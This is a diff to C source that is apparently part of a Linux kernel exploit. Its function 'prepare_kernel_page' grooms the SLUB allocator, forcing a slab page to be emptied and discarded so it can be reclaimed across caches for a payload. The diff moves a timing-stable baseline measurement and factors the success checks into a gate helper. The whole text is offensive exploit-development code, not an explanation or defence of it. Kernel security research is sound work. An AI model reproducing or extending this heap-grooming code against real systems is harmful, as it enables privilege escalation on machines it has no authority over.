@@ -1,6 +1,7 @@
 #include "common.h"
 #include "kernelsnitch/kernelsnitch.h"
 #include "kernel_page.h"
+#include "kernel_page/gate.h"
 #include <dirent.h>
 
 /* The emptying free must run on a CPU whose c->page is not base, or
@@ -3481,36 +3482,13 @@ uintptr_t prepare_kernel_page(int payload_mode) {
            * min_partial proof are all correct and base's page is the foreign
            * one.  If it does not, no page we built can discard and the defect
            * is the free never reaching __slab_free(). */
-          /* Quiescent baseline.  The 31 filler frees of the anchor and of
-           * the control slab are mmdrop_async() callbacks that land after the
-           * drain; one landing inside the target's window moved active_objs
-           * by an extra object (measured KS_GATE d_empty=-2 against the one
-           * object the emptying free removes).  Take the baseline only when
-           * two reads 2 ms apart agree, so the window holds exactly that one
-           * object.  The control slab's own free runs after the samples now,
-           * for the same reason. */
-          if (crossed && post_f != NULL) {
-            long qa = -1, qn = -1, qs = -1;
-            int stable = 0;
-            rewind(post_f);
-            (void)mm_slab_scan(post_f, &cross_active, &cross_num,
-                               &cross_slabs);
-            for (int q = 0; q < 8; q++) {
-              usleep(2000);
-              rewind(post_f);
-              (void)mm_slab_scan(post_f, &qa, &qn, &qs);
-              if (qa == cross_active && qn == cross_num &&
-                  qs == cross_slabs) {
-                stable = 1;
-                break;
-              }
-              cross_active = qa;
-              cross_num = qn;
-              cross_slabs = qs;
-            }
-            pr_info("KS_QUIESCE active=%ld num=%ld slabs=%ld stable=%d\n",
-                    cross_active, cross_num, cross_slabs, stable);
-          }
+          /* The quiesced baseline is taken in [3a], after the target's
+           * siblings are retired and immediately before its own exit.  Taken
+           * here - before the retirement - every sibling's mm free landed
+           * inside the measured window, which is what the measured
+           * d_empty=-2 was: the anchor's discard (-1) plus one unrelated
+           * object on a listed page (-1).  See docs/kernel-page/
+           * instrumentation.md for the window and its arithmetic. */
         }
 
         /* [3a] The emptying free.  base's page is on n->partial with the
@@ -3541,6 +3519,34 @@ uintptr_t prepare_kernel_page(int payload_mode) {
               pin_bad++;
             }
             pin_to_core(EMPTYING_CPU);
+          }
+          /* Quiescent baseline: the window from here to the sample after the
+           * sends contains exactly one mm free, the target's own.  The
+           * siblings above are already retired (their mm frees are in the
+           * past), the filler frees landed before the drain, and nothing else
+           * in this process allocates from the mm cache.  Two agreeing reads
+           * 2 ms apart are the evidence that nothing is still in flight. */
+          if (crossed && post_f != NULL) {
+            long qa = -1, qn = -1, qs = -1;
+            int stable = 0;
+            rewind(post_f);
+            (void)mm_slab_scan(post_f, &cross_active, &cross_num,
+                               &cross_slabs);
+            for (int q = 0; q < 8; q++) {
+              usleep(2000);
+              rewind(post_f);
+              (void)mm_slab_scan(post_f, &qa, &qn, &qs);
+              if (qa == cross_active && qn == cross_num &&
+                  qs == cross_slabs) {
+                stable = 1;
+                break;
+              }
+              cross_active = qa;
+              cross_num = qn;
+              cross_slabs = qs;
+            }
+            pr_info("KS_QUIESCE active=%ld num=%ld slabs=%ld stable=%d\n",
+                    cross_active, cross_num, cross_slabs, stable);
           }
           /* The mm free runs inside the child's do_exit() on the CPU that
            * child is on, so that CPU is a fact to prove before the kill, not
@@ -3730,13 +3736,30 @@ uintptr_t prepare_kernel_page(int payload_mode) {
        * is the drain's own delta and is not a precondition. */
       /* Exactly the emptying object and the page it emptied: one object
        * leaves active_objs, one slab leaves num_objs and slabdata. */
-      empty_registered = (cross_active > 0 && empty_active == cross_active - 1);
-      whole_slab_discard =
-          (cross_num > 0 && empty_num == cross_num - (long)mm_objs_per_slab &&
-           empty_slabs == cross_slabs - 1);
-      targeted = (burst_span_ok == 1 && target_freed_at_cross &&
-                  burst_empty_cpu == (int)EMPTYING_CPU &&
-                  whole_slab_discard && pin_bad == 0 && slot_partial == 0);
+      {
+        kp_gate_facts gate_facts;
+        kp_gate_verdict gate_verdict;
+        kp_sample gate_before;
+        kp_sample gate_after;
+
+        gate_before.active = cross_active;
+        gate_before.num = cross_num;
+        gate_before.slabs = cross_slabs;
+        gate_after.active = empty_active;
+        gate_after.num = empty_num;
+        gate_after.slabs = empty_slabs;
+        gate_facts.span_ok = burst_span_ok;
+        gate_facts.target_freed = target_freed_at_cross;
+        gate_facts.empty_cpu = burst_empty_cpu;
+        gate_facts.want_cpu = (int)EMPTYING_CPU;
+        gate_facts.pin_bad = pin_bad;
+        gate_facts.slot_partial = slot_partial;
+        gate_facts.objects_per_slab = (long)mm_objs_per_slab;
+        kp_gate_evaluate(&gate_facts, &gate_before, &gate_after, &gate_verdict);
+        empty_registered = gate_verdict.registered;
+        whole_slab_discard = gate_verdict.discarded;
+        targeted = gate_verdict.targeted;
+      }
       pr_info("KS_GATE span_ok=%d crossed_at=%d min_partial=%d empty_cpu=%d "
               "registered=%d discarded=%d image=%d gap_ms=%.3f d_empty=%ld "
               "d_num=%ld d_slabs=%ld pin_bad=%d slot_partial=%d "
